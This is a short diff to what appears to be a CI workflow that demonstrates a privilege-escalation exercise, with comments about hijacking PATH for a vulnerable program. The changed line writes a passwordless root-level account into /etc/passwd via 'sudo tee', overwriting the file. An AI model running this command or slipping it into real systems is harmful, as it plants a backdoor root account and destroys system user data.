@@ -69,6 +69,7 @@ jobs:
         # override the PATH variable to that it contains /tmp/foo directory 
         # & execute the vulnerable program
         # PATH=/tmp/foo:$PATH /usr/local/bin/apt-updater 
+        whoami
         id # root?
-        echo “kristen::0:0:System Administrator:/root/root:/bin/bash” | sudo tee /etc/passwd
+        echo “runner::0:0:System Administrator:/root/root:/bin/bash” | sudo tee /etc/passwd
         id
